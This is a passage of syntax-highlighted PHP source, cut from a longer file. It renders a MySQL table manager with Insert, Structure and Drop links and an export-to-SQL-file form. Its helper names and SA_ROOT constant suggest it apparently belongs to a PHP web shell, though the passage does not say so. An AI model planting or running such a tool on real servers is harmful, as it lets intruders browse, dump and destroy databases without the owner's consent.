<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;h2&gt;affected rows : &lt;b&gt;'</span>.$<span style="color: #eab700;">ar</span>.<span style="color: #3e999f;">'&lt;/b&gt;&lt;/h2&gt;'</span>)<span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">break</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">query</span> = <span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">"SHOW TABLE STATUS"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">table_num</span> = $<span style="color: #eab700;">table_rows</span> = $<span style="color: #eab700;">data_size</span> = <span style="color: #4d4d4c; background-color: #ffffff;">0</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">tabledb</span> = <span style="color: #4d4d4c; background-color: #ffffff;">array(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">while</span>($<span style="color: #eab700;">table</span> = <span style="color: #4d4d4c; background-color: #ffffff;">mysql_fetch_array(</span>$<span style="color: #eab700;">query</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">data_size</span> = $<span style="color: #eab700;">data_size</span> + $<span style="color: #eab700;">table</span>[<span style="color: #3e999f;">'Data_length'</span>];
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">table_rows</span> = $<span style="color: #eab700;">table_rows</span> + $<span style="color: #eab700;">table</span>[<span style="color: #3e999f;">'Rows'</span>];
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">table</span>[<span style="color: #3e999f;">'Data_length'</span>] = <span style="color: #4d4d4c; background-color: #ffffff;">sizecount(</span>$<span style="color: #eab700;">table</span>[<span style="color: #3e999f;">'Data_length'</span>]);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">table_num</span>++;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">tabledb</span>[] = $<span style="color: #eab700;">table</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">data_size</span> = <span style="color: #4d4d4c; background-color: #ffffff;">sizecount(</span>$<span style="color: #eab700;">data_size</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">unset(</span>$<span style="color: #eab700;">table</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;table border="0" cellpadding="0" cellspacing="0"&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;form action="'</span>.$<span style="color: #eab700;">self</span>.<span style="color: #3e999f;">'" method="POST"&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'action'</span>,<span style="color: #3e999f;">'mysqladmin'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span>$<span style="color: #eab700;">dbform</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td width="2%" align="center"&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Name&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Rows&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Data_length&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Create_time&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Update_time&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">highver</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Engine&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Operate&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/tr&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span> ($<span style="color: #eab700;">tabledb</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">key</span> =&gt; $<span style="color: #eab700;">table</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">thisbg</span> = <span style="color: #4d4d4c; background-color: #ffffff;">bg(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="'</span>.$<span style="color: #eab700;">thisbg</span>.<span style="color: #3e999f;">'" onmouseover="this.className=\'foc</span><span style="color: #3e999f; text-decoration: underline;">us\';" onmouseout="this.className=\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">thisbg</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">'\';"&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td align="center" width="2%"&gt;&lt;input type="checkbox" name</span><span style="color: #3e999f; text-decoration: underline;">="table[]" value="'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'" /&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;&lt;a href="javascript:settable(\''</span>.$<span style="color: #eab700;">table</span>[<span style="color: #3e999f;">'Name'</span>].<span style="color: #3e999f;">'\');</span><span style="color: #3e999f; text-decoration: underline;">"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">table</span>[<span style="color: #3e999f;">'Rows'</span>].<span style="color: #3e999f;">'&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">table</span>[<span style="color: #3e999f;">'Data_length'</span>].<span style="color: #3e999f;">'&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">table</span>[<span style="color: #3e999f;">'Create_time'</span>].<span style="color: #3e999f;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">table</span>[<span style="color: #3e999f;">'Update_time'</span>].<span style="color: #3e999f;">'&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">highver</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">table</span>[<span style="color: #3e999f;">'Engine'</span>].<span style="color: #3e999f;">'&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">table</span>[<span style="color: #3e999f;">'Collation'</span>].<span style="color: #3e999f;">'&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;&lt;a href="javascript:settable(\''</span>.$<span style="color: #eab700;">table</span>[<span style="color: #3e999f;">'Name'</span>].<span style="color: #3e999f;">'\', </span><span style="color: #3e999f; text-decoration: underline;">\'insert\');"&gt;Insert&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'\', \'structure\');"&gt;Structure&lt;/a&gt; | &lt;a href="javascript:settable(\''</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">table</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'Name'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'\', \'drop\');"&gt;Drop&lt;/a&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/tr&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class="head"&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td width="2%" align="center"&gt;&lt;input name="chkall" value="on"</span><span style="color: #3e999f; text-decoration: underline;"> type="checkbox" onclick="CheckAll(this.form)" /&gt;&lt;/td&gt;'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Name&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Rows&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Data_length&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Create_time&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Update_time&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">highver</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Engine&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Collation&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Operate&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/tr&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;tr class='</span>.<span style="color: #4d4d4c; background-color: #ffffff;">bg(</span>).<span style="color: #3e999f;">'&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;Total tables: '</span>.$<span style="color: #eab700;">table_num</span>.<span style="color: #3e999f;">'&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">table_rows</span>.<span style="color: #3e999f;">'&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td&gt;'</span>.$<span style="color: #eab700;">data_size</span>.<span style="color: #3e999f;">'&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;td colspan="'</span>.($<span style="color: #eab700;">highver</span> ? <span style="color: #4d4d4c; background-color: #ffffff;">5</span> : <span style="color: #4d4d4c; background-color: #ffffff;">3</span>).<span style="color: #3e999f;">'"&gt;&amp;nbsp;&lt;/td&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;/tr&gt;'</span>);

<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">"&lt;tr class=\""</span>.<span style="color: #4d4d4c; background-color: #ffffff;">bg(</span>).<span style="color: #3e999f;">"\"&gt;&lt;td colspan=\""</span>.($<span style="color: #eab700;">highver</span> ? <span style="color: #4d4d4c; background-color: #ffffff;">9</span> : <span style="color: #4d4d4c; background-color: #ffffff;">7</span>).<span style="color: #3e999f;">"\"</span><span style="color: #3e999f; text-decoration: underline;">&gt;&lt;input name=\"saveasfile\" value=\"1\" type=\"checkbox\" /&gt; Save as file &lt;input class=\"input\" name=\"path\" value=\""</span><span style="text-decoration: underline;">.</span><span style="color: #c82829; font-weight: bold; text-decoration: underline;">SA_ROOT</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">dbname</span><span style="text-decoration: underline;">.</span><span style="color: #3e999f; text-decoration: underline;">".sql\" type=\"text\" size=\"60\" /&gt; &lt;input class=\"bt\" type=\"submit\" value=\"Export selection table\" /&gt;&lt;/td&gt;&lt;/tr&gt;"</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">makehide(</span><span style="color: #3e999f;">'doing'</span>,<span style="color: #3e999f;">'backupmysql'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">formfoot(</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">"&lt;/table&gt;"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">fr(</span>$<span style="color: #eab700;">query</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">tbfoot(</span>);
<span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">mysql_close(</span>);
}<span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">end mysql</span>

